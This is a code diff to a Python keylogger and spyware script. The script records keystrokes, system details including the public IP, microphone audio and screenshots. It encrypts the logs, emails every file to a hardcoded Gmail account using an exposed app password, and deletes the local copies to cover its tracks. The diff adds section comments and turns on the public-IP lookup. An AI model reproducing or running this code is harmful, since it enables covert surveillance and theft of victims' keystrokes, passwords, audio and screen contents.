@@ -19,9 +19,12 @@ import wave
 
 from cryptography.fernet import Fernet
 
-from multiprocessing import Process, freeze_support
+import getpass
+from requests import get
+
 from PIL import ImageGrab
 
+# Variables
 key_info = r"/key_log.txt"
 system_info = r"/sys_details.txt"
 audio_info = r"/audio_rec.wav"
@@ -39,6 +42,7 @@ email_addr = "anteikuu20@gmail.com"
 password = "erfe mdvm mnck pghf"
 toaddr = "anteikuu20@gmail.com"
 
+# Keylogger
 keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
 def on_press(key):
@@ -51,6 +55,7 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
+# Email functionality (send files to specified email address)
 def send_email(filename, attachment, toaddr):
     fromaddr = email_addr
 
@@ -84,14 +89,14 @@ def send_email(filename, attachment, toaddr):
 
 send_email(key_info, log_dir + key_info, toaddr)
 
+# Retrieve user's system details
 def system_details():
     with open(log_dir + system_info, 'a') as f:
         hostname = socket.gethostname()
         ip_addr = socket.gethostbyname(hostname)
         try:
-            #ip_public = get("https://api.ipify.org").text
-            #f.write("Public IP Address: " + ip_public + "\n")
-            False
+            ip_public = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + ip_public + "\n")
 
         except Exception:
             f.write("Failed to retrieve Public IP Address (max query)\n")
@@ -104,6 +109,7 @@ def system_details():
 
 system_details()
 
+# Retrieve user's mic audio
 def mic_audio():
     chunk = 1024
     format = pyaudio.paInt16
@@ -137,6 +143,7 @@ def mic_audio():
 mic_audio()
 send_email(audio_info, log_dir + audio_info, toaddr)
 
+# Retrieves screen capture of user's current screen
 def screenshot():
     im = ImageGrab.grab()
     im.save(log_dir + screenshot_info)
@@ -144,6 +151,7 @@ def screenshot():
 screenshot()
 send_email(screenshot_info, log_dir + screenshot_info, toaddr)
 
+# Encrypting .txt files
 files = [log_dir + key_info, log_dir + system_info]
 encrypted_files = [log_dir + e_key_info, log_dir + e_system_info]
 
@@ -162,6 +170,7 @@ for encrypting_files in files:
     send_email(encrypted_files[count], encrypted_files[count], toaddr)
     count += 1
 
+# Cleanup/delete local files (after sent to email)
 delete_files = [system_info, key_info, screenshot_info, audio_info]
 for file in delete_files:
     os.remove(log_dir + file)
